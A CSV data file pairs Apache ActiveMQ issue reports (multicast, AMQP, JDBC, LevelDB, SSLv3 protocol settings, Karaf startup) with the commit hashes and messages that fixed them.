bug id,bug key,bug description,commit hash,commit msg
12767517,AMQ-5520,"
If no network interface is explicitly set, it calls mcast.joinGroup(inetAddress); without setting one on the MulticastSocket.  In that case, MulticastSocket then calls NetworkInterface.getDefault().    The ""default"" interface on a system is relatively unpredictable and COULD result in a network interface that isn't even multicast enabled.     On my mac, it's selecting a ""awdl0"" interface which doesn't support multicast.   If I have Parallels running, it sometimes picks up one of those interfaces.   It also sometimes picks up an ipv6 only network interface which also doesn't support the ipv4 broadcast address.

It would be better to enumerate the network interfaces and at least make sure we grab one that support multicast on ipv4 and is ""up"".

Note:  this causes some test failures on my machine.  Specifically SpringTest.testSenderWithSpringXmlEmbeddedPooledBrokerConfiguredViaXml fails.",f4eade2bb3bb83131f17d2768d2218770f0123d3,[AMQ-5520] Use a network interface that actually supports multicast and is up
12767495,AMQ-5519,"When attempting to unregister a DurableSubscription that does not exist via AMQP, the broker currently returns the ""amqp:internal-error"" condition when closing the link. Using the ""amqp:not-found"" condition would be more appropriate.",6466ae2bcfa8831d79f71e94709b0511dc1367cf,"AMQ-5519: use the NOT_FOUND error condition when failing to find a DurableSubscription

https://issues.apache.org/jira/browse/AMQ-5519"
12766507,AMQ-5514,Minor updates for the 5.10.1 release are included here.,3e007d89a27f4c74d33862b9967676c683faec51,[AMQ-5514] Add the 5.10.1 release to the spring.schemas file.
12761103,AMQ-5484,On close of sender links we do not clean up all the mappings for the ConsumerContext instances which leads a build up of context objects in the subscriptions map.,9bd070a8f6337a3452a8529a0647970cc8c6deae,"https://issues.apache.org/jira/browse/AMQ-5484

Ensure that the subscriptionByConsumerId map gets cleaned up when a
sender is closed."
12757695,AMQ-5457,"With a prefetch smaller than queue depth a browse of delivered and unconsumed messages will loos message order. The prefetched messages appearing after the rest of the messages in the queue. The dispatch order is preserved, but the JMX destination view browse list order is incorrect.

Sending 100 messages, consuming 5 with prefetch 10 and closing the consumer. A subsequent QueueView.browse 
Expect [5,6,...100] but get [20,21...100,5,6...]",74f530a6410522df76e842a3f2498a3442db5281,https://issues.apache.org/jira/browse/AMQ-5457 - fix and test - we now peek first in redeliveredWaitingDispatch
12756913,AMQ-5447,"After shutdown embeded activemq broker with JDBC store, 2 'ActiveMQ JDBC PA Scheduled Task' is still alive.
Because the 2 thread's Thread factory is object of JDBCPersistenceAdapter's inner class, so the object of JDBCPersistenceAdapter can be reached from the 2 threads, JDBCPersistenceAdapter has a field point to BrokerService. So the instance of BrokerService can be reached from the 2 threads.

So the stopped brokerService cannot be GC.

The root cause is that when stopping JDBCPersistenceAdapter, only cancelling cleanupTicket without shutdown clockDaemon, that's why the 2 threads are still alive.

According to http://activemq.apache.org/how-do-i-restart-embedded-broker.html, it's better (more reliable) to instantiate the broker again instead of reuse old broker. So if I restart embeded broker, there will be  1 more BrokerService in memory. I think it's memory leak.",51566104abd46722c73d71534e7576b5377d799c,"https://issues.apache.org/jira/browse/AMQ-5447

shutdown the scheduled executer so that any scheduled tasks are canceled
and removed on stop."
12751349,AMQ-5417,"TaskRunnerFactory's default executor is initialised when the first task is executed. It's also given the ThreadFactory object, which is used to create threads for the thread pool. The issue with this is when the first task is initiated from the vm transport in osgi environment, we can have transport connector threads for other transport executed in the wrong classpath. This could lead to various problems afterwards. There needs to be a way to provide the desired classloader for those threads",dffccb1c7dc8e4b4a6282fd5056dfd854d2d2a9b,https://issues.apache.org/jira/browse/AMQ-5417 - use proper classloader in TaskRunnerFactory
12750445,AMQ-5413,"Using Apache Qpid test clients qpid-send and qpid-receive ActiveMQ broker behaves differently from qpidd and I'm wondering if the difference is important.

The test code command lines are:
{noformat}
qpid-send -a ""chuck; {create:always}"" --connection-options {protocol:amqp1.0} --sequence yes --content-string 0
qpid-receive -a chuck -m 1 --connection-options ""{protocol:amqp1.0}"" --print-headers yes
{noformat}

When I run the tests against qpidd they send one message and receive one message every time. However against ActiveMQ 5.11 the qpid-receive does not receive the message until one of several conditions:
* the qpid-receive command also includes ""--timeout 1""
* the qpid-receive command is repeated several, possibly dozens, of times.

When qpidd broker is running or when activemq is running and --timeout is specified then the qpid-receive output is:
{noformat}
chug@FJELD ~> qpid-receive -a chuck -m 1 --connection-options ""{protocol:amqp1.0}"" --print-headers yes
Properties: {sn:1, ts:1414177685195174548, x-amqp-first-acquirer:True}

0
{noformat}

However, activemq running the client twice without the timeout and once with the timeout looks like this:
{noformat}
chug@FJELD ~> qpid-receive -a chuck -m 1 --connection-options ""{protocol:amqp1.0}"" --print-headers yes
chug@FJELD ~> qpid-receive -a chuck -m 1 --connection-options ""{protocol:amqp1.0}"" --print-headers yes
chug@FJELD ~> qpid-receive -a chuck -m 1 --connection-options ""{protocol:amqp1.0}"" --print-headers yes --timeout 1
Redelivered: true
Properties: {sn:1, ts:1414178091185765136, x-amqp-delivery-count:1}

0
{noformat}

The false receive attempts make the message look like it was already delivered, hence the Redelivered: true, first-acquirer absent and the x-amqp-delivery-count setting.

Views of the protocol interactions between the brokers and clients are here:
http://people.apache.org/~chug/adverb_qpid_send_receive_1/

I ran the tests twice on ActiveMQ with the tcpnodelay option turned on and off but that didn't seem to make any difference.",5e7b70f11fb53cb1a0a00edc5e61faf90bbdce78,"https://issues.apache.org/jira/browse/AMQ-5413

ensure drain completion clear currently tracked credit value, next flow
should update to the correct value."
12749889,AMQ-5407,"If you are using nio+ssl and try to set specific protocols (i.e. TLS and not SSLv3) for openwire and or stomp with ssl, NIO will ignore those settings and allow SSLv3 anyway.

Setting specific transport protocols for activemq in my activemq.xml file:

{noformat}
<transportConnectors>
<transportConnector name=""openwire"" uri=""nio+ssl://0.0.0.0:61616?transport.enabledProtocols=TLSv1,TLSv1.1,TLSv1.2"">
</transportConnector>
<transportConnector name=""stomp+ssl"" uri=""stomp+nio+ssl://0.0.0.0:61613?transport.enabledProtocols=TLSv1,TLSv1.1,TLSv1.2"">
</transportConnector>
{noformat}

After changing this, I restarted activemq to ensure that those protocols were set correctly.

With this setting in activemq.xml, activemq should not be able to do a successful SSLv3 handshake, however using s_connect with openssl, I am able to get activemq to respond with SSLv3:

{noformat}
###########
# command run: openssl s_client -ssl3 -connect hostname.com:61616
###########

###########
# this is what should be displayed
###########
CONNECTED(00000003)
139975367284552:error:14094410:SSL routines:SSL3_READ_BYTES:sslv3 alert handshake failure:s3_pkt.c:1256:SSL alert number 40
139975367284552:error:1409E0E5:SSL routines:SSL3_WRITE_BYTES:ssl handshake failure:s3_pkt.c:596:
---
no peer certificate available
---
No client certificate CA names sent
---
SSL handshake has read 7 bytes and written 0 bytes
---
New, (NONE), Cipher is (NONE)
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
SSL-Session:
    Protocol  : SSLv3
    Cipher    : 0000
    Session-ID:
    Session-ID-ctx:
    Master-Key:
    Key-Arg   : None
    Krb5 Principal: None
    PSK identity: None
    PSK identity hint: None
    Start Time: 1414003656
    Timeout   : 7200 (sec)
    Verify return code: 0 (ok)
---
###########
# this is what is actually shown
###########


CONNECTED(00000003)
depth=0 CN = puppetmaster.local
verify error:num=20:unable to get local issuer certificate
verify return:1
depth=0 CN = puppetmaster.local
verify error:num=27:certificate not trusted
verify return:1
depth=0 CN = puppetmaster.local
verify error:num=21:unable to verify the first certificate
verify return:1
---
Certificate chain
 0 s:/CN=puppetmaster.local
   i:/CN=Puppet CA generated on puppetmaster.local at 2014-10-22 11:20:52 -0700
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIFyzCCA7OgAwIBAgIBAjANBgkqhkiG9w0BAQsFADBRMU8wTQYDVQQDDEZQdXBw
ZXQgQ0EgZ2VuZXJhdGVkIG9uIHB1cHBldG1hc3Rlci5sb2NhbCBhdCAyMDE0LTEw
LTIyIDExOjIwOjUyIC0wNzAwMB4XDTE0MTAyMTE4MjA1N1oXDTE5MTAyMTE4MjA1
N1owHTEbMBkGA1UEAwwScHVwcGV0bWFzdGVyLmxvY2FsMIICIjANBgkqhkiG9w0B
AQEFAAOCAg8AMIICCgKCAgEAyehXPWPLEuNkvvl0PHbz5cIbg4i7v51P0FzYfxR7
sUt4455c4htfVpvEmWc1Ef5HD2MFViIAHorDMeGzNY2kAaX6xK2JVNhi8m8EJF7L
C0LncN59p/DIc5XBl6fFGu8FGaEZ1wvRSOyitcsWCk5Gk8Oi8w56/xV7WVJJ1Lch
PV62TZbKqDT8Ah/VcfIaCCWVCAB59/kIIGPJ8eI3aLdQv3f5h89ETiTr4yLtd1xm
z25qqPV2JZIh1yAGBCjBGsE6L41eyckZy9Tl1JZaDTRfOiXK6SkaK8NTNNbuXeQT
GkLusxpUL+FmisiH1ikazKZkyRuA0vMyQiakgUleVtACt4x+oLJ9askf5nx36wGu
HcU5kaIuy2d8cLq2CD+FKLOdH10+KiMlxCtHny4pY15LIzs3F1wjqoeLwpcoQwoM
57Qnef8UNV0sQGlp/HkSxnhDwXh5mrXGLkpi11glTx4CIs7Yz8s7yC1FCvw8/wAi
3oDrmSAgidZXKd0MT+PT+4PTDHbC+p2TG6noX+GnrAjhKFKWyw31ue9pUMX/X2Az
ExXiLFw2+zH+YsMNvHdTq4BM7G3s0tgQD3UQkWkDPk+0R3X14WDFTGUZ7oEb6Q+o
/R+SE8W/rEwRw/O2tE6Xq063DyB4EYI+bVojpwtqOwyCNkbbC5aNnraUWfuXMWJB
oqECAwEAAaOB4TCB3jA1BglghkgBhvhCAQ0EKFB1cHBldCBSdWJ5L09wZW5TU0wg
SW50ZXJuYWwgQ2VydGlmaWNhdGUwJQYDVR0RBB4wHIIGcHVwcGV0ghJwdXBwZXRt
YXN0ZXIubG9jYWwwDgYDVR0PAQH/BAQDAgWgMCAGA1UdJQEB/wQWMBQGCCsGAQUF
BwMBBggrBgEFBQcDAjAMBgNVHRMBAf8EAjAAMB0GA1UdDgQWBBQSS72jRveOqBkQ
TbLxTT2j5DWLPDAfBgNVHSMEGDAWgBRKtJ+dt+VxU6IwhHMYMAY78E7BOTANBgkq
hkiG9w0BAQsFAAOCAgEATFMfxi1jFbnvTxiArZrL0RsA2mgBoU3p6gYhthmBWfzz
7OscRacWx7CvBXGdKi3oc2uyNVIsazS30Yw5vcfoTqUAT9TdsDLMf10h9AYp15ut
K1ebZUc9OIf00+zF/IT/+CFXM9eKzgBxs6fKUKCKngI+kDYRD+h5qmAhUCeAAR9B
+3kb8UV064Nlmla+x4zOZBzb+VSMWKSet/Sv4pMHusX2+ICvy0cRwwKmaVTzQVDS
uTNlElYUM0xRXb10tS95j4S7MSYkKu2VHLD5F5LB8KxjhCcorwa323DnCQkywJLQ
3S1UUH3recjoLeD9Huj8+EL7uEvQdloRPbS/2cWFKkJgXYc5t7yC7Dp8qKNzTuNy
COp68xunNPHh/JcS3wo4F/H7t2ve5IFnca4H/kSvLQWOQzmLfOrNhkn6ZJkqqGMo
zf2LHVvJpfAUV6ezR1O0i70GR3YkNIijok14WMinDOXN98VLMp0j9zWm5aBF5Chg
zRFIvrvz/NbwMtawZ/QD/B+kOolfKCNku9xkQ6wrHj6GikH4GYwWzfTZmpaOE4GC
Dm8Axn5Ax+psLO10N4xwSxeB/zzygD4wDsQxP0kRg6lFIVQgfKmaJA07IcotCL9p
M4ugQDGnWAjzBRqbvh5x37dc15C8F3fluSxC4yq5jv0EVeXooZISigG6Sr3rhpE=
-----END CERTIFICATE-----
subject=/CN=puppetmaster.local
issuer=/CN=Puppet CA generated on puppetmaster.local at 2014-10-22 11:20:52 -0700
---
No client certificate CA names sent
---
SSL handshake has read 2474 bytes and written 322 bytes
---
New, TLSv1/SSLv3, Cipher is DHE-RSA-AES256-SHA
Server public key is 4096 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
SSL-Session:
    Protocol  : SSLv3
    Cipher    : DHE-RSA-AES256-SHA
    Session-ID: 5447F9BA158D679AE17BAD85A384B43C5B1EE597F7F0AAC01418156FC9E08924
    Session-ID-ctx:
    Master-Key: 96B8081CB3EC675CF2CDD0546435760871491908C10E36E8ECA622155FFE4CAA0F851DC95F63C2C476727EDC985B2DD7
    Key-Arg   : None
    Krb5 Principal: None
    PSK identity: None
    PSK identity hint: None
    Start Time: 1414003130
    Timeout   : 7200 (sec)
    Verify return code: 21 (unable to verify the first certificate)
---
�ActiveMQ
�
        MaxFrameSize�������  CacheSize
                                         CacheEnabledSizePrefixDisabled MaxInactivityDurationInitalDelay'TcpNoDelayEnabledMaxInactivityDurationu0TightEncodingEnabledStackTraceEnabled
{noformat}

Removing nio from both the stomp and openwire transport connector settings (and restarting activemq) actually removes the ability to talk over SSLv3 using the technique I posted before, however putting nio back in ignores those transport connector settings and allows SSLv3.",1948fe41a35d895589dfd14d85aee75078a8415b,"https://issues.apache.org/jira/browse/AMQ-5407

Allow config of enabled protocols for nio+ssl and stomp+nio+ssl etc to
match the capability of the non-nio transports."
12749461,AMQ-5404,"During numerous test runs we've seen the file system fill up (df -k) and eventually ActiveMQ failing with a short write error.  When ActiveMQ falls over the file system is freed up to its original state. 

Before ActiveMQ falls over we've tried to find the reason for the file system filling up by hunting through the directories but to no avail.  However when we do a lsof -a +L1 we can see numerous deleted LevelDB log and index files.   

Does anybody know why ActiveMQ/LevelDB is not releasing these files for full clear up by the OS. 

This is on 
Red Hat Linux 6.4 
ActiveMQ 5.10 
Java 1.7.0_45 ",9de3fff1f5c7741e8b22d821aadc4225cd3500a4,Fixes AMQ-5404: LevelDB files not being released after deletion
12732737,AMQ-5315,"We have seen the following NPE setting up a demand forwarding bridge
{code}
java.lang.NullPointerException: null
	at org.apache.activemq.network.DemandForwardingBridgeSupport.collectBrokerInfos(DemandForwardingBridgeSupport.java:365) [activemq-broker-5.10.0.jar:5.10.0]
	at org.apache.activemq.network.DemandForwardingBridgeSupport.access$400(DemandForwardingBridgeSupport.java:105) [activemq-broker-5.10.0.jar:5.10.0]
	at org.apache.activemq.network.DemandForwardingBridgeSupport$5.run(DemandForwardingBridgeSupport.java:331) [activemq-broker-5.10.0.jar:5.10.0]
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) [na:1.7.0_60]
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) [na:1.7.0_60]
	at java.lang.Thread.run(Thread.java:745) [na:1.7.0_60]
{code}

This occurred in one of our tests but only under load so seems to be a race condition of some sort.
",c391321d1b5b59542d847717654b0d4dba54cf2f,"https://issues.apache.org/jira/browse/AMQ-5315

Fix for potential NPE on transport error."
12731312,AMQ-5304,"When configuring the authorization plugin with a <tempDestinationAuthorizationEntry> that also set a groupClass, this groupClass is not properly applied to the TempDestinationAuthorizationEntry instance. 

E.g. consider this example config
{code:xml}
      <authorizationPlugin>
        <map>
          <authorizationMap groupClass=""org.apache.karaf.jaas.boot.principal.RolePrincipal"">
            <authorizationEntries>
              <authorizationEntry queue="">"" read=""admin"" write=""client,admin"" admin=""client,admin"" />
              <authorizationEntry topic="">"" read=""client,admin"" write=""admin"" admin=""admin""/>
              <authorizationEntry topic=""ActiveMQ.Advisory.>"" read=""admin,client"" write=""admin,client"" admin=""admin""/>
           </authorizationEntries>

           <tempDestinationAuthorizationEntry>
             <tempDestinationAuthorizationEntry read=""client,admin"" write=""client,admin"" admin=""client,admin"" groupClass=""org.apache.karaf.jaas.boot.principal.RolePrincipal""/>
           </tempDestinationAuthorizationEntry>

         </authorizationMap>
        </map>
      </authorizationPlugin>
{code}


The groupClass attribute is set on the TempDestinationAuthorizationEntry instance but we don't apply the groupClass to the AuthorizationEntry by calling afterPropertiesSet();

As a result, authorization fails when trying to create a temp destination. 
This can happen when deploying the broker inside a Karaf container and have Karaf do the authentication (such as in JBoss A-MQ). 
The groupClass is properly set on the authorizationEntries within the <authorizationEntries> list and only fails to be applied properly on the tempDestinationAuthorizationEntry. 



",acf84b43e9b7c8aaf92784569075f00e83cf4809,https://issues.apache.org/jira/browse/AMQ-5304 - providing test case
12731312,AMQ-5304,"When configuring the authorization plugin with a <tempDestinationAuthorizationEntry> that also set a groupClass, this groupClass is not properly applied to the TempDestinationAuthorizationEntry instance. 

E.g. consider this example config
{code:xml}
      <authorizationPlugin>
        <map>
          <authorizationMap groupClass=""org.apache.karaf.jaas.boot.principal.RolePrincipal"">
            <authorizationEntries>
              <authorizationEntry queue="">"" read=""admin"" write=""client,admin"" admin=""client,admin"" />
              <authorizationEntry topic="">"" read=""client,admin"" write=""admin"" admin=""admin""/>
              <authorizationEntry topic=""ActiveMQ.Advisory.>"" read=""admin,client"" write=""admin,client"" admin=""admin""/>
           </authorizationEntries>

           <tempDestinationAuthorizationEntry>
             <tempDestinationAuthorizationEntry read=""client,admin"" write=""client,admin"" admin=""client,admin"" groupClass=""org.apache.karaf.jaas.boot.principal.RolePrincipal""/>
           </tempDestinationAuthorizationEntry>

         </authorizationMap>
        </map>
      </authorizationPlugin>
{code}


The groupClass attribute is set on the TempDestinationAuthorizationEntry instance but we don't apply the groupClass to the AuthorizationEntry by calling afterPropertiesSet();

As a result, authorization fails when trying to create a temp destination. 
This can happen when deploying the broker inside a Karaf container and have Karaf do the authentication (such as in JBoss A-MQ). 
The groupClass is properly set on the authorizationEntries within the <authorizationEntries> list and only fails to be applied properly on the tempDestinationAuthorizationEntry. 



",6bdce73d838abccd8495c979c45bbff8a8bdfc5f,https://issues.apache.org/jira/browse/AMQ-5304 - ignore the test for now
12731312,AMQ-5304,"When configuring the authorization plugin with a <tempDestinationAuthorizationEntry> that also set a groupClass, this groupClass is not properly applied to the TempDestinationAuthorizationEntry instance. 

E.g. consider this example config
{code:xml}
      <authorizationPlugin>
        <map>
          <authorizationMap groupClass=""org.apache.karaf.jaas.boot.principal.RolePrincipal"">
            <authorizationEntries>
              <authorizationEntry queue="">"" read=""admin"" write=""client,admin"" admin=""client,admin"" />
              <authorizationEntry topic="">"" read=""client,admin"" write=""admin"" admin=""admin""/>
              <authorizationEntry topic=""ActiveMQ.Advisory.>"" read=""admin,client"" write=""admin,client"" admin=""admin""/>
           </authorizationEntries>

           <tempDestinationAuthorizationEntry>
             <tempDestinationAuthorizationEntry read=""client,admin"" write=""client,admin"" admin=""client,admin"" groupClass=""org.apache.karaf.jaas.boot.principal.RolePrincipal""/>
           </tempDestinationAuthorizationEntry>

         </authorizationMap>
        </map>
      </authorizationPlugin>
{code}


The groupClass attribute is set on the TempDestinationAuthorizationEntry instance but we don't apply the groupClass to the AuthorizationEntry by calling afterPropertiesSet();

As a result, authorization fails when trying to create a temp destination. 
This can happen when deploying the broker inside a Karaf container and have Karaf do the authentication (such as in JBoss A-MQ). 
The groupClass is properly set on the authorizationEntries within the <authorizationEntries> list and only fails to be applied properly on the tempDestinationAuthorizationEntry. 



",98f707bd1e733821a02e13b6ae0fe9bc8a0ed9b0,https://issues.apache.org/jira/browse/AMQ-5304 - still missing unit test case
12726356,AMQ-5266,"With multiple concurrent producer transactions and active fast consumers it is possible to get out of order db insertions and scans resulting in a skipped dispatch. This scenario is exacerbated when the cursor cache is disabled because every dispatch will potentially result in a scan.
the JDBC store maps jms transaction to jdbc connection transactions at the point of a commit and these can occur in parallel. The broker tracks a sequenceId to ensure ordering relative to a jms connection and  scans respect that order but there is currently nothing to stop a scan seeing a later sequence before an earlier sequence is stored. In other words, inserts can race, but the reader needs to limit a read to the lowest outstanding sequence.

On a restart, any stuck messages will be replayed correctly, because the cursor transient state w.r.t to the last sequence id read will be reset.",428fc82c8cad36fe600a68cffeb3c4161a345a17,AMQ5266Test can take 8mins locally - exclude from quick tests
12726356,AMQ-5266,"With multiple concurrent producer transactions and active fast consumers it is possible to get out of order db insertions and scans resulting in a skipped dispatch. This scenario is exacerbated when the cursor cache is disabled because every dispatch will potentially result in a scan.
the JDBC store maps jms transaction to jdbc connection transactions at the point of a commit and these can occur in parallel. The broker tracks a sequenceId to ensure ordering relative to a jms connection and  scans respect that order but there is currently nothing to stop a scan seeing a later sequence before an earlier sequence is stored. In other words, inserts can race, but the reader needs to limit a read to the lowest outstanding sequence.

On a restart, any stuck messages will be replayed correctly, because the cursor transient state w.r.t to the last sequence id read will be reset.",7c116631b504e31fb0bd9f805b1b77090d16f4ff,AMQ-5266 - fix leak in transaction context - completions were not cleared on close/commit
12720840,AMQ-5223,Adding <packaging>bunde<packaging> fixes the issue,7ceb4d0c8e55364c21e798918eaf1fdb18b95138,"https://issues.apache.org/jira/browse/AMQ-5223

Added the bundle packaging option"
12720635,AMQ-5222,"I enabled deletion of Inactive Queue for POC every 10 seconds
<policyEntry queue="">"" producerFlowControl=""true"" memoryLimit=""20mb""   gcInactiveDestinations=""true"" inactiveTimoutBeforeGC=""10000"">.

Now I start a Consumer Listener process..The Queue is created and then it is deleted though Consumer is still running and Active..I would expect this to should not be deleted as it still has active Queue

Looking @ code BaseDestination->markForGC(long timeStamp) & BaseDestination->canGC() seems to be suspect based on usage from RegionBroker->purgeInactiveDestinations
",6ac3138daff50b8ba0620d31f5b36d83d0316540,"https://issues.apache.org/jira/browse/AMQ-5222

Add test to show this is working as it should."
12711935,AMQ-5167,"Steps to reprodouce: 

1. start Karaf 2.3.5 or 3.0.1. 
2. install activemq feature : 
feature:repo-add activemq 5.9.1 
feature:install activemq-broker 

Stack trace: 

~~~
aused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter': Instantiation of bean failed; nested exception is org.springframework.beans.BeanInstantiationException: Could not instantiate bean class [org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter]: Constructor threw exception; nested exception is java.lang.NoClassDefFoundError: javax/xml/stream/XMLStreamException
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateBean(AbstractAutowireCapableBeanFactory.java:1037)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:983)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:487)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:458)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:289)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.DispatcherServlet.createDefaultStrategy(DispatcherServlet.java:810)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.DispatcherServlet.getDefaultStrategies(DispatcherServlet.java:779)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.DispatcherServlet.initHandlerAdapters(DispatcherServlet.java:587)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.DispatcherServlet.initStrategies(DispatcherServlet.java:444)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.DispatcherServlet.onRefresh(DispatcherServlet.java:432)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.FrameworkServlet.onApplicationEvent(FrameworkServlet.java:772)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.FrameworkServlet$ContextRefreshListener.onApplicationEvent(FrameworkServlet.java:1083)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.FrameworkServlet$ContextRefreshListener.onApplicationEvent(FrameworkServlet.java:1080)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.context.event.GenericApplicationListenerAdapter.onApplicationEvent(GenericApplicationListenerAdapter.java:51)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.context.event.SourceFilteringListener.onApplicationEventInternal(SourceFilteringListener.java:96)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.context.event.SourceFilteringListener.onApplicationEvent(SourceFilteringListener.java:68)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:96)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:334)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.context.support.AbstractApplicationContext.finishRefresh(AbstractApplicationContext.java:948)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:482)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.FrameworkServlet.configureAndRefreshWebApplicationContext(FrameworkServlet.java:651)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.FrameworkServlet.createWebApplicationContext(FrameworkServlet.java:599)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.FrameworkServlet.createWebApplicationContext(FrameworkServlet.java:665)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.FrameworkServlet.initWebApplicationContext(FrameworkServlet.java:518)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:459)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.HttpServletBean.init(HttpServletBean.java:136)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at javax.servlet.GenericServlet.init(GenericServlet.java:161)[80:org.apache.geronimo.specs.geronimo-servlet_3.0_spec:1.0]
	at org.eclipse.jetty.servlet.ServletHolder.initServlet(ServletHolder.java:532)[85:org.eclipse.jetty.aggregate.jetty-all-server:8.1.14.v20131031]
	... 33 more
Caused by: org.springframework.beans.BeanInstantiationException: Could not instantiate bean class [org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter]: Constructor threw exception; nested exception is java.lang.NoClassDefFoundError: javax/xml/stream/XMLStreamException
	at org.springframework.beans.BeanUtils.instantiateClass(BeanUtils.java:163)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:87)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateBean(AbstractAutowireCapableBeanFactory.java:1030)[145:org.apache.activemq.activemq-web-console:5.9.1]
	... 60 more
Caused by: java.lang.NoClassDefFoundError: javax/xml/stream/XMLStreamException
	at org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.<init>(AnnotationMethodHandlerAdapter.java:203)[145:org.apache.activemq.activemq-web-console:5.9.1]
~~~",25600944e662279ec1113acd4d27e9c64ba8415f,AMQ-5167 ActiveMQ web-cosole fails to start in Karaf - missing import
